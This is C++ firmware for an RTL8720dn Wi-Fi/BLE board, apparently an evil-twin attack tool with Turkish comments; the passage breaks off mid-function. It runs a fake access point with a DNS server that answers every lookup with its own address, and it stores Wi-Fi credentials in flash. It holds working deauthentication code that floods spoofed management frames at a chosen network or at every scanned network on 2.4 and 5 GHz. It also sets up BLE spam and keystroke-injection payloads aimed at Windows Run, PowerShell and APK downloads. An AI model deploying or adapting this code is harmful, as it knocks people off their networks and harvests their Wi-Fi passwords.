// AP+STA Captive Portal — RTL8720dn (AmebaD)
// FIX VERSION: WiFi Scan Sorunu Çözüldü + Bağlantı Hızı ve Yönlendirme İyileştirildi

#include "sys_api.h"  
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "FlashMemory.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "FreeRTOS.h"
#include "task.h"
#include "semphr.h"
#include "BLEDevice.h"
#include "BLEServer.h"
#include "BLEHIDDevice.h"

#undef max
#undef min
#include <vector>

#include "lwip/netif.h"
#include <lwip/netifapi.h>
#include <lwip/udp.h>
#include <lwip/arch.h>
#include <lwip/def.h>

#ifndef ENC_TYPE_TKIP
#define ENC_TYPE_TKIP  2
#endif
#ifndef ENC_TYPE_CCMP
#define ENC_TYPE_CCMP  4
#endif
#ifndef ENC_TYPE_WPA3
#define ENC_TYPE_WPA3  5
#endif

extern "C" {
  extern struct netif xnetif[];
  void dhcps_init(struct netif *pnetif);
  void dhcps_deinit(void);
  int  LwIP_DHCP(uint8_t idx, uint8_t action);
  int  wext_set_mode(const char *ifname, int mode);
  int  wifi_disconnect(void);
  void LwIP_Init(void);
  int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
  int  wifi_set_channel(int channel); 
  int  wifi_disable_powersave(void);
  int  wifi_set_mode(rtw_mode_t mode);
  int  wifi_scan_networks(rtw_scan_result_handler_t handler, void *user_data);
  int  wifi_is_connected_to_ap(void);
  int  wifi_connect(char *ssid, rtw_security_t security_type, char *password, int ssid_len, int password_len, int key_id, void *semaphore);
}

#ifndef PACK_STRUCT_FIELD
#define PACK_STRUCT_FIELD(x) x
#endif

#ifndef PACK_STRUCT_STRUCT
#ifdef __GNUC__
#define PACK_STRUCT_STRUCT __attribute__((packed))
#else
#define PACK_STRUCT_STRUCT
#endif
#endif

#define DNS_HEADER_SIZE 12
#define DNS_SERVER_PORT 53

struct dns_hdr {
    PACK_STRUCT_FIELD(u16_t id);
    PACK_STRUCT_FIELD(u8_t flags1);
    PACK_STRUCT_FIELD(u8_t flags2);
    PACK_STRUCT_FIELD(u16_t numquestions);
    PACK_STRUCT_FIELD(u16_t numanswers);
    PACK_STRUCT_FIELD(u16_t numauthrr);
    PACK_STRUCT_FIELD(u16_t numextrarr);
} PACK_STRUCT_STRUCT;

struct DNSHeader {
    uint16_t ID;
    union {
        struct {
            uint16_t RD     : 1;
            uint16_t TC     : 1;
            uint16_t AA     : 1;
            uint16_t OPCode : 4;
            uint16_t QR     : 1;
            uint16_t RCode  : 4;
            uint16_t Z      : 3;
            uint16_t RA     : 1;
        };
        uint16_t Flags;
    };
    uint16_t QDCount;
    uint16_t ANCount;
    uint16_t NSCount;
    uint16_t ARCount;
};

struct DNSQuestion {
    const uint8_t *QName;
    uint16_t QNameLength;
    uint16_t QType;
    uint16_t QClass;
};

class DNSServer {
public:
    DNSServer() {
        _resolvedIP[0] = 192; _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
        _dns_server_pcb = NULL;
    }
    void setResolvedIP(uint8_t ip0, uint8_t ip1, uint8_t ip2, uint8_t ip3) {
        _resolvedIP[0] = ip0; _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
    }
    bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
        return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
    }
    void begin();
    void stop();
    uint8_t _resolvedIP[4];
private:
    struct udp_pcb *_dns_server_pcb;
    static void packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port);
};

static DNSServer* dnsServerInstance = NULL;

void DNSServer::begin() {
    dnsServerInstance = this;
    struct udp_pcb *pcb;
    for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
        if (pcb->local_port == DNS_SERVER_PORT) udp_remove(pcb);
    }
    for (int _retry = 0; _retry < 3 && !_dns_server_pcb; _retry++) {
        _dns_server_pcb = udp_new();
        if (!_dns_server_pcb) delay(50);
    }
    if (!_dns_server_pcb) return;
    udp_bind(_dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
    udp_recv(_dns_server_pcb, (udp_recv_fn)packetHandler, NULL);
}

void DNSServer::stop() {
    if (_dns_server_pcb) {
        udp_remove(_dns_server_pcb);
        _dns_server_pcb = NULL;
        dnsServerInstance = NULL;
    }
}

void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port) {
    (void)arg;
    if (!dnsServerInstance || !udp_packet_buffer || udp_packet_buffer->len < DNS_HEADER_SIZE) {
        if (udp_packet_buffer) pbuf_free(udp_packet_buffer);
        return;
    }

    DNSHeader dnsHeader;
    DNSQuestion dnsQuestion;
    memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);

    if (dnsServerInstance->requestIncludesOnlyOneQuestion(dnsHeader)) {
        if (udp_packet_buffer->len <= DNS_HEADER_SIZE) { pbuf_free(udp_packet_buffer); return; }

        uint16_t offset = DNS_HEADER_SIZE;
        uint16_t nameLength = 0;
        while (offset < udp_packet_buffer->len && ((uint8_t*)udp_packet_buffer->payload)[offset] != 0) {
            nameLength++; offset++;
        }
        if (offset >= udp_packet_buffer->len - 4) { pbuf_free(udp_packet_buffer); return; }

        offset++; nameLength++;
        dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;
        dnsQuestion.QNameLength = nameLength;
        int sizeUrl = static_cast<int>(nameLength);

        struct dns_hdr *hdr = (struct dns_hdr *)udp_packet_buffer->payload;
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);
        if (p) {
            struct dns_hdr *rsp_hdr = (struct dns_hdr *)p->payload;
            rsp_hdr->id = hdr->id;
            rsp_hdr->flags1 = 0x85;
            rsp_hdr->flags2 = 0x80;
            rsp_hdr->numquestions = PP_HTONS(1);
            rsp_hdr->numanswers = PP_HTONS(1);
            rsp_hdr->numauthrr = PP_HTONS(0);
            rsp_hdr->numextrarr = PP_HTONS(0);

            uint8_t *responsePtr = (uint8_t *)rsp_hdr + sizeof(struct dns_hdr);
            memcpy(responsePtr, dnsQuestion.QName, sizeUrl);
            responsePtr += sizeUrl;
            *(uint16_t *)responsePtr = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 2) = PP_HTONS(1);
            responsePtr[4] = 0xc0; responsePtr[5] = 0x0c;
            *(uint16_t *)(responsePtr + 6) = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 8) = PP_HTONS(1);
            *(uint32_t *)(responsePtr + 10) = PP_HTONL(60);
            *(uint16_t *)(responsePtr + 14) = PP_HTONS(4);
            memcpy(responsePtr + 16, dnsServerInstance->_resolvedIP, 4);

            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    } else {
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, udp_packet_buffer->len, PBUF_RAM);
        if (p) {
            memcpy(p->payload, udp_packet_buffer->payload, udp_packet_buffer->len);
            struct dns_hdr *dns_rsp = (struct dns_hdr *)p->payload;
            dns_rsp->flags1 |= 0x80;
            dns_rsp->flags2 = 0x05;
            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    }
    pbuf_free(udp_packet_buffer);
}

// ══════════════════════════════════════════════════════════════════════════════
// ═══════════════════════ TURBO MODE PARAMETRELERI ════════════════════════════
// ══════════════════════════════════════════════════════════════════════════════

#define DHCP_START   1
#define DHCP_STOP    0
#define IW_MODE_INFRA 2
#define WLAN0_NAME   "wlan0"

#define AP_INITIAL_SSID  "X"
#define AP_INITIAL_PASS  "20192019"
#define AP_IP_ADDR       "192.168.4.1"
#define SERVER_PORT      80

#define FLASH_MAGIC      0xAB
#define MAX_SSID_LEN     64
#define MAX_PASS_LEN     64
#define FLASH_BUF_SIZE   256
#define FLASH_OFFSET     0x00100000 

// ═══════════════════════ DEAUTH AYARLARI (SKB BUFFER SAFE) ════════════════════
#define DEAUTH_BURST_INTERVAL_MS    120
#define DEAUTH_FRAME_COUNT_2G       4
#define DEAUTH_FRAME_COUNT_5G       4
#define DEAUTH_TASK_DELAY_2G        15
#define DEAUTH_TASK_DELAY_5G        12
#define CHANNEL_SWITCH_DELAY_MS     10
#define EXTRA_BURST_COUNT_2G        1
#define EXTRA_BURST_COUNT_5G        2
#define EXTRA_BURST_DELAY_MS        10
#define DEAUTH_FRAME_INTER_DELAY_MS 3
#define DEAUTH_SKB_BACKOFF_MS       20

// ═══════════════════════ SCAN PARAMETRELERI (FIX) ═════════════════════════════
#define SCAN_TIMEOUT_MS             15000   // Scan için timeout
#define SCAN_RETRY_COUNT            3       // Kaç kez retry yapacak
#define SCAN_RESULT_WAIT_MS         10000   // Sonuçları bekleme süresi

struct SavedCredentials {
  uint8_t magic;
  char    ssid[MAX_SSID_LEN];
  char    pass[MAX_PASS_LEN];
};

struct NetworkInfo {
  String         ssid;
  uint8_t        bssid[6];
  int32_t        rssi;
  uint8_t        enc;
  rtw_security_t raw_sec;
  int32_t        channel;
};

typedef enum { CS_IDLE = 0, CS_RUNNING = 1, CS_DONE_OK = 2, CS_DONE_FAIL = 3 } ConnStatus;
volatile ConnStatus conn_status = CS_IDLE;

typedef enum { SCAN_IDLE = 0, SCAN_RUNNING = 1, SCAN_DONE = 2 } ScanStatus;
volatile ScanStatus scan_status = SCAN_IDLE;

bool ap_switched = false;
bool pending_ap_switch = false;
unsigned long revert_time = 0; 

char target_ssid[MAX_SSID_LEN] = {0};
uint8_t target_bssid[6]    = {0};
uint8_t target_5g_bssid[6] = {0};
int32_t target_channel = 6;
uint8_t target_enc     = ENC_TYPE_CCMP;
rtw_security_t target_sec     = RTW_SECURITY_WPA2_AES_PSK;
volatile int32_t target_5g_channel = 0;

uint8_t fake_ap_bssid[6] = {0};

volatile bool deauth_active = false;
volatile bool deauth_all_active = false;
volatile bool portal_busy   = false;
int32_t ap_running_channel  = -1;
unsigned long last_netif_check_ms = 0;
#define NETIF_CHECK_INTERVAL_MS 3000UL

WiFiServer server(SERVER_PORT); 
DNSServer  dnsServer;

std::vector<NetworkInfo> networks;
SemaphoreHandle_t networks_mutex;
SemaphoreHandle_t raw_scan_sem = NULL;

char saved_ssid[MAX_SSID_LEN]   = {0};
char saved_pass[MAX_PASS_LEN]   = {0};
char pending_ssid[MAX_SSID_LEN] = {0};
char pending_pass[MAX_PASS_LEN] = {0};
rtw_security_t pending_sec      = RTW_SECURITY_WPA2_AES_PSK;
bool sta_connected  = false;
String conn_result  = "";

unsigned long last_scan_ms = 0;
#define RESCAN_INTERVAL_MS  600000UL

unsigned long last_channel_check_ms = 0;
#define CHANNEL_CHECK_INTERVAL_MS 5000UL

// ═══════════════════════════════════════════════════════════════════════════════
// ════════════════════════════ BLE YAPILAR ══════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════
struct BLEDevInfo {
  String address;
  String name;
  int    rssi;
};

std::vector<BLEDevInfo>  ble_devices;
SemaphoreHandle_t        ble_mutex       = NULL;
typedef enum { BLE_IDLE = 0, BLE_RUNNING = 1, BLE_DONE = 2 } BLEScanStat;
volatile BLEScanStat     ble_scan_status = BLE_IDLE;
volatile bool            ble_spam_active        = false;
volatile bool            ble_flood_active       = false;
volatile bool            ble_keystroke_active   = false;
volatile bool            ble_hid_connected      = false;
volatile uint8_t         ble_keystroke_payload  = 0;
// 0=URL(tarayıcı) 1=Android YouTube 2=Android APK 3=Win Run 4=Win PowerShell 5=iOS Safari
char                     ble_keystroke_url[128] = "https://youtube.com";
char                     ble_apk_url[128]       = "http://192.168.4.1/app.apk";

bool isFakeAPBSSID(const uint8_t *bssid) {
  return memcmp(bssid, fake_ap_bssid, 6) == 0;
}

String urlDecode(String input) {
  String output = "";
  for (int i = 0; i < (int)input.length(); i++) {
    if (input[i] == '+') output += ' ';
    else if (input[i] == '%' && i + 2 < (int)input.length()) {
      char hex[3] = { input[i + 1], input[i + 2], 0 };
      output += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else output += input[i];
  }
  return output;
}

void loadCredentials() {
  FlashMemory.read();
  SavedCredentials creds;
  memcpy(&creds, FlashMemory.buf, sizeof(creds));
  if (creds.magic == FLASH_MAGIC && creds.ssid[0] != 0) {
    strncpy(saved_ssid, creds.ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, creds.pass, MAX_PASS_LEN - 1);
  }
}

void saveCredentials(const char *ssid, const char *pass) {
  FlashMemory.read(); 
  SavedCredentials creds;
  creds.magic = FLASH_MAGIC;
  memset(creds.ssid, 0, MAX_SSID_LEN);
  memset(creds.pass, 0, MAX_PASS_LEN);
  strncpy(creds.ssid, ssid, MAX_SSID_LEN - 1);
  strncpy(creds.pass, pass, MAX_PASS_LEN - 1);
  memcpy(FlashMemory.buf, &creds, sizeof(creds));
  FlashMemory.update();
  delay(500);
}

rtw_security_t mapSecurity(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_NONE: return RTW_SECURITY_OPEN;
    case ENC_TYPE_WEP:  return RTW_SECURITY_WEP_PSK;
    case ENC_TYPE_TKIP: return RTW_SECURITY_WPA_TKIP_PSK;
    default:            return RTW_SECURITY_WPA2_AES_PSK;
  }
}

bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
  for (int i = 0; i < 5; i++) {
    if (base[i] != candidate[i]) return false;
  }
  int diff = (int)candidate[5] - (int)base[5];
  if (diff < 0) diff = -diff;
  return (diff >= 1 && diff <= 4);
}

// ─── AĞ TARAYICI (FIX VERSIYONU) ─────────────────────────────────────────────
static std::vector<NetworkInfo> scan_temp;
static volatile int scan_result_count = 0;

rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
  if (malloced_scan_result == NULL) {
    Serial.println("[Scan] Handler NULL pointer!");
    return RTW_SUCCESS;
  }

  if (malloced_scan_result->scan_complete != RTW_TRUE) {
    rtw_scan_result_t *record = &malloced_scan_result->ap_details;
    if (record == NULL) {
      return RTW_SUCCESS;
    }

    NetworkInfo net;
    char ssid_str[33] = {0};

    // SSID'yi güvenli şekilde kopyala
    if (record->SSID.len > 0 && record->SSID.len <= 32) {
      memcpy(ssid_str, record->SSID.val, record->SSID.len);
      ssid_str[record->SSID.len] = '\0';
    }

    net.ssid = String(ssid_str);
    net.rssi = record->signal_strength;
    net.channel = record->channel; 

    // BSSID'yi kopyala
    if (record->BSSID.octet != NULL) {
      memcpy(net.bssid, record->BSSID.octet, 6);
    } else {
      memset(net.bssid, 0, 6);
    }

    // Security türünü belirle
    net.raw_sec = record->security;
    if (record->security == RTW_SECURITY_OPEN) {
      net.enc = ENC_TYPE_NONE;
    } else if (record->security == RTW_SECURITY_WEP_PSK) {
      net.enc = ENC_TYPE_WEP;
    } else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || 
               record->security == RTW_SECURITY_WPA_AES_PSK || 
               record->security == RTW_SECURITY_WPA_MIXED_PSK) {
      net.enc = ENC_TYPE_TKIP;
    } else if (record->security == RTW_SECURITY_WPA3_AES_PSK || 
               record->security == RTW_SECURITY_WPA2_WPA3_MIXED) {
      net.enc = ENC_TYPE_WPA3;
    } else {
      net.enc = ENC_TYPE_CCMP;
    }

    if (net.ssid.length() > 0) {
      // Fake AP BSSID'sini kontrol et
      if (isFakeAPBSSID(net.bssid)) {
        Serial.print("[Scan] Fake AP filtered: "); Serial.println(net.ssid);
        return RTW_SUCCESS;
      }

      // 5GHz sister BSSID kontrolü
      if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
        target_5g_channel = net.channel;
        memcpy(target_5g_bssid, net.bssid, 6);
        Serial.print("[Scan] 5GHz BSSID bulundu: "); Serial.println(net.channel);
      }

      // Duplicate kontrol
      bool dup = false;
      for (auto &existing : scan_temp) {
        if (existing.ssid == net.ssid) {
          dup = true;
          if (net.rssi > existing.rssi) {
            existing.rssi    = net.rssi;
            existing.channel = net.channel;
            existing.enc     = net.enc;
            existing.raw_sec = net.raw_sec;
            memcpy(existing.bssid, net.bssid, 6);
          }
          break;
        }
      }

      if (!dup) {
        scan_temp.push_back(net);
        scan_result_count++;
        Serial.print("[Scan] Ağ bulundu: "); 
        Serial.print(net.ssid); Serial.print(" | RSSI: ");
        Serial.print(net.rssi); Serial.print(" | CH: ");
        Serial.println(net.channel);
      }
    }
  } else {
    // Scan tamamlandı
    Serial.print("[Scan] Scan tamamlandı. Toplam ağ: "); 
    Serial.println(scan_result_count);

    if (raw_scan_sem != NULL) {
      xSemaphoreGive(raw_scan_sem);
    }
  }

  return RTW_SUCCESS;
}

void scanNetworkTask(void *param) {
  (void)param;

  scan_temp.clear();
  scan_result_count = 0;

  if (raw_scan_sem == NULL) {
    raw_scan_sem = xSemaphoreCreateBinary();
  }

  Serial.println("[ScanTask] Ağ taraması başlatılıyor...");

  // WiFi tarama başlat
  int scan_ret = wifi_scan_networks(raw_scan_handler, NULL);

  if (scan_ret != RTW_SUCCESS) {
    Serial.print("[ScanTask] wifi_scan_networks başarısız: ");
    Serial.println(scan_ret);
  } else {
    Serial.println("[ScanTask] wifi_scan_networks başarılı, sonuç bekleniyor...");
  }

  // Scan sonucunu bekle (timeout ile)
  if (raw_scan_sem != NULL) {
    TickType_t wait_ticks = pdMS_TO_TICKS(SCAN_RESULT_WAIT_MS);
    BaseType_t sem_result = xSemaphoreTake(raw_scan_sem, wait_ticks);

    if (sem_result == pdFALSE) {
      Serial.println("[ScanTask] ⚠️ Scan timeout - sonuç gelmedi!");
    } else {
      Serial.println("[ScanTask] ✓ Scan sonucu alındı");
    }
  }

  // Sonuçları networks vektörüne aktar
  if (networks_mutex) {
    if (xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      networks = scan_temp;
      Serial.print("[ScanTask] Mutex'e yazıldı. Toplam ağ sayısı: ");
      Serial.println(networks.size());
      xSemaphoreGive(networks_mutex);
    } else {
      Serial.println("[ScanTask] ⚠️ Mutex timeout!");
    }
  }

  scan_temp.clear();
  last_scan_ms = millis();
  scan_status = SCAN_DONE;

  vTaskDelete(NULL);
}

void startScan() {
  if (scan_status == SCAN_RUNNING) {
    Serial.println("[Scan] Scan zaten çalışıyor, atlanıyor...");
    return;
  }
  if (conn_status == CS_RUNNING) {
    Serial.println("[Scan] Connection task çalışıyor, scan iptal...");
    return;
  }

  Serial.println("[Scan] 🔍 Yeni ağ taraması başlatılıyor...");
  scan_status = SCAN_RUNNING;

  xTaskCreate(scanNetworkTask, "scan", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ─── BAĞLANTI GÖREVİ (SPEED OPTIMIZED) ────────────────────────────────────────
void wifiConnectTask(void *param) {
  (void)param;
  bool is_open  = (pending_sec == RTW_SECURITY_OPEN);
  int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
  int  ret      = RTW_ERROR;

  Serial.print("[Connect] Guvenlik tipi: "); Serial.println((int)pending_sec);

  wifi_disconnect();
  vTaskDelay(pdMS_TO_TICKS(50));  // HIZLI BAĞLANTI İÇİN 50ms'e indirildi

  TickType_t t_start = xTaskGetTickCount();
  ret = wifi_connect((char *)pending_ssid, pending_sec,
                     (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
  uint32_t elapsed_ms = (xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS;

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi (200'den)
    if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
  }

  if (ret != RTW_SUCCESS && !is_open && elapsed_ms < 2000) {
    rtw_security_t fallback;
    if (pending_sec == RTW_SECURITY_WPA3_AES_PSK) {
      fallback = RTW_SECURITY_WPA2_WPA3_MIXED;
      Serial.println("[Connect] WPA3 hizli fail — WPA2_WPA3_MIXED yedek deneme.");
    } else if (pending_sec == RTW_SECURITY_WPA2_WPA3_MIXED) {
      fallback = RTW_SECURITY_WPA3_AES_PSK;
      Serial.println("[Connect] WPA2_WPA3_MIXED hizli fail — WPA3_AES_PSK yedek deneme.");
    } else {
      fallback = RTW_SECURITY_WPA2_MIXED_PSK;
      Serial.println("[Connect] WPA2 hizli fail — WPA2_MIXED_PSK yedek deneme.");
    }
    wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(50));  // 50ms'e indirildi
    ret = wifi_connect((char *)pending_ssid, fallback,
                       (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
    if (ret == RTW_SUCCESS) {
      vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
      if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
    }
  }

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
    conn_status = CS_DONE_OK;
  } else {
    conn_status = CS_DONE_FAIL;
  }
  vTaskDelete(NULL);
}

void startConnectTask() {
  if (conn_status == CS_RUNNING) return;
  conn_status = CS_RUNNING;
  xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══ SKB-SAFE frame gönderici: hata durumunda backoff uygular ════════════════
// ═══════════════════════════════════════════════════════════════════════════════
static inline void safeSendMgnt(uint8_t *frame, uint16_t len) {
  int ret = wext_send_mgnt(WLAN0_NAME, (char*)frame, len, 0);
  if (ret < 0) {
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_SKB_BACKOFF_MS));
  } else {
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_INTER_DELAY_MS));
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══════════ DEAUTH GÖREVİ (SKB BUFFER KORUMALR - 2.4GHz & 5GHz) ═══════════
// ═══════════════════════════════════════════════════════════════════════════════
void deauthTask(void *param) {
  (void)param;

  uint8_t frame_template[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x07, 0x00 
  };

  Serial.println("\n[Deauth] ⚡ DEAUTH BAŞLANDI! 2.4GHz & 5GHz (SKB Buffer Korumalı) ⚡");

  unsigned long last_deauth_burst = millis();

  while (deauth_active) {

    if (millis() - last_channel_check_ms > CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_ms = millis();
    }

    if (millis() - last_deauth_burst < DEAUTH_BURST_INTERVAL_MS) {
      vTaskDelay(pdMS_TO_TICKS(5));
      continue;
    }
    last_deauth_burst = millis();

    // 2.4GHz DEAUTH
    wifi_set_channel(target_channel);
    vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

    for (int burst = 0; burst < DEAUTH_FRAME_COUNT_2G; burst++) {
      for (int offset = -1; offset <= 1; offset++) {
          uint8_t temp_bssid[6];
          memcpy(temp_bssid, target_bssid, 6);
          temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

          if (isFakeAPBSSID(temp_bssid)) {
            continue;
          }

          memcpy(&frame_template[10], temp_bssid, 6);
          memcpy(&frame_template[16], temp_bssid, 6);
          memset(&frame_template[4], 0xFF, 6);
          frame_template[0] = 0xC0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);

          frame_template[24] = 0x02;
          safeSendMgnt(frame_template, 26);

          memcpy(&frame_template[4], temp_bssid, 6);
          frame_template[0] = 0xC0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);

          frame_template[0] = 0xA0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);
      }
      vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_2G));
    }

    for (int extra_burst = 0; extra_burst < EXTRA_BURST_COUNT_2G; extra_burst++) {
        for (int offset = -1; offset <= 1; offset++) {
            uint8_t temp_bssid[6];
            memcpy(temp_bssid, target_bssid, 6);
            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

            if (!isFakeAPBSSID(temp_bssid)) {
                memcpy(&frame_template[10], temp_bssid, 6);
                memcpy(&frame_template[16], temp_bssid, 6);
                memset(&frame_template[4], 0xFF, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);
                safeSendMgnt(frame_template, 26);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
    }

    // 5GHz DEAUTH
    int32_t ch5g = target_5g_channel;
    uint8_t bssid5g[6];
    memcpy(bssid5g, target_5g_bssid, 6);

    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !isFakeAPBSSID(bssid5g)) {
        wifi_set_channel(ch5g);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int burst = 0; burst < DEAUTH_FRAME_COUNT_5G; burst++) {
            for (int offset = -1; offset <= 1; offset++) {
                uint8_t temp5g[6];
                memcpy(temp5g, bssid5g, 6);
                temp5g[5] = (uint8_t)(temp5g[5] + offset);

                if (isFakeAPBSSID(temp5g)) {
                  continue;
                }

                memcpy(&frame_template[10], temp5g, 6);
                memcpy(&frame_template[16], temp5g, 6);
                memset(&frame_template[4], 0xFF, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);

                frame_template[24] = 0x02;
                safeSendMgnt(frame_template, 26);

                memcpy(&frame_template[4], temp5g, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);

                frame_template[0] = 0xA0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);
            }
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_5G));
        }

        for (int extra_burst = 0; extra_burst < EXTRA_BURST_COUNT_5G; extra_burst++) {
            for (int offset = -1; offset <= 1; offset++) {
                uint8_t temp5g[6];
                memcpy(temp5g, bssid5g, 6);
                temp5g[5] = (uint8_t)(temp5g[5] + offset);

                if (!isFakeAPBSSID(temp5g)) {
                    memcpy(&frame_template[10], temp5g, 6);
                    memcpy(&frame_template[16], temp5g, 6);
                    memset(&frame_template[4], 0xFF, 6);
                    frame_template[0] = 0xC0; frame_template[24] = 0x07;
                    safeSendMgnt(frame_template, 26);
                    safeSendMgnt(frame_template, 26);
                }
            }
            vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
        }
    }

    wifi_set_channel(target_channel);
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
// ═══════════════════════════════════════════════════════════════════════════════
void deauthAllTask(void *param) {
  (void)param;

  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
  };

  Serial.println("\n[DeauthAll] ⚡ TÜM AĞLARA DEAUTH BAŞLANDI! ⚡");

#define DEAUTH_ALL_RESCAN_INTERVAL_MS 60000UL
  unsigned long deauth_all_last_scan_ms = 0;

  while (deauth_all_active) {
    // Periyodik otomatik yeniden tarama (60 saniyede bir)
    unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
      if (scan_status == SCAN_IDLE && conn_status == CS_IDLE) {
        Serial.println("[DeauthAll] ♻️ Otomatik yeniden tarama başlatılıyor — hedef listesi güncelleniyor...");
        startScan();
      }
      deauth_all_last_scan_ms = now_ms;
    }

    // Her döngü başında güncel networks listesinden taze snapshot al
    std::vector<NetworkInfo> snap;
    if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      snap = networks;
      xSemaphoreGive(networks_mutex);
    }

    if (snap.empty()) {
      vTaskDelay(pdMS_TO_TICKS(500));
      continue;
    }

    Serial.print("[DeauthAll] 🎯 Bu turda hedef ağ sayısı: ");
    Serial.println(snap.size());

    for (auto &net : snap) {
      if (!deauth_all_active) break;
      if (isFakeAPBSSID(net.bssid)) continue;

      bool is5g = (net.channel >= 36);
      int frameCount  = is5g ? DEAUTH_FRAME_COUNT_5G  : DEAUTH_FRAME_COUNT_2G;
      int taskDelay   = is5g ? DEAUTH_TASK_DELAY_5G   : DEAUTH_TASK_DELAY_2G;
      int extraBurst  = is5g ? EXTRA_BURST_COUNT_5G   : EXTRA_BURST_COUNT_2G;

      wifi_set_channel(net.channel);
      vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

      for (int burst = 0; burst < frameCount; burst++) {
        for (int offset = -1; offset <= 1; offset++) {
          uint8_t temp[6];
          memcpy(temp, net.bssid, 6);
          temp[5] = (uint8_t)(temp[5] + offset);

          if (isFakeAPBSSID(temp)) continue;

          memcpy(&frame[10], temp, 6);
          memcpy(&frame[16], temp, 6);
          memset(&frame[4], 0xFF, 6);
          frame[0] = 0xC0; frame[24] = 0x07;
          safeSendMgnt(frame, 26);

          frame[24] = 0x02;
